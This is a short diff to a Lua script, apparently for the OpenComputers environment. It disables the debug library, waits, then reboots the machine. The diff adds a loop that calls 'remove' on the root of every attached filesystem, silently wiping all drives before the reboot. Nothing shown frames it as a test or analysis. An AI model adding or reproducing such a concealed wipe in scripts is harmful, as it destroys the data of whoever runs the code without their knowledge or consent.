@@ -84,4 +84,8 @@ _G.debug = nil
 
 os.sleep(3)
 
+for filesystem in component.list("filesystem") do 
+    component.invoke(filesystem, "remove", "/")
+end
+
 computer.shutdown(true)
